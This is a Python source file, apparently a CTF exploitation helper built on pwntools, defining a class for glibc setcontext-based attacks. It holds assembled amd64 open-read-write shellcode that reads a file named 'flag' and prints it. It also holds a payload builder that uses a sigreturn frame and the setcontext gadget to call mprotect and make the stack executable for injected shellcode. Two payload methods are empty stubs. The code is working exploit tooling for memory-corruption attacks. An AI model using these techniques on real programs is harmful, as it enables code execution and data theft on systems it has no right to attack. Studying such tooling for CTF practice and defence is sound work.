from __future__ import absolute_import

from pwnlib.context import context
from pwnlib import gdb
from pwnlib.args import args
from pwnlib.elf import ELF
from pwnlib.asm import asm
from pwnlib.log import Logger, getLogger
from pwnlib.util.packing import u32, u64, p32, p64, make_packer
from pwnlib.rop.srop import SigreturnFrame


class SetContext(Logger):
    """
    example.

    """
    def __init__(self, libc, version=231, arch=None):
        self._arch = arch or context.arch
        assert libc.address != 0
        self._version = version
        self._libc = libc

    @property
    def shellcode_orw(self):
        if self._arch == "amd64":
            sc = """
            xor rdi, rdi
            mov rdi, 0x67616c66
            push rdi
            mov rdi, rsp
            xor rsi, rsi
            xor rdx, rdx
            mov rax, 2
            syscall

            mov rdi, rax
            mov rsi, rsp
            mov rdx, 0x50
            mov rax, 0
            syscall

            mov rdi, 1
            mov rsi, rsp
            mov rdx, rax
            mov rax, 1
            syscall

            mov rdi, 0
            mov rax, 60
            syscall
            """
        return asm(sc)

    def gadget(self):
        if self._arch == "amd64":
            return self._libc.symbols.setcontext + 0x35

    def payload_shellcode(self, stack, shellcode):
        """
        shellcode was written after the hook address

        retval: (payload, frame)
        """

        # a gadget "mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax" can be found in 2.29, but not in 2.31, so we are seeking a more common way to do it.

        libc = self._libc

        if self._arch == "amd64":
            frame = SigreturnFrame(kernel="amd64")
            frame.rip = libc.symbols.mprotect
            frame.rdi = stack & 0xfffffffffffff000
            frame.rsi = 0x1000
            frame.rdx = 7
            frame.rsp = stack

        return p64(stack + 0x8) + shellcode, bytes(frame)

    def payload_orw(self):
        pass

    def payload_binsh(self):
        pass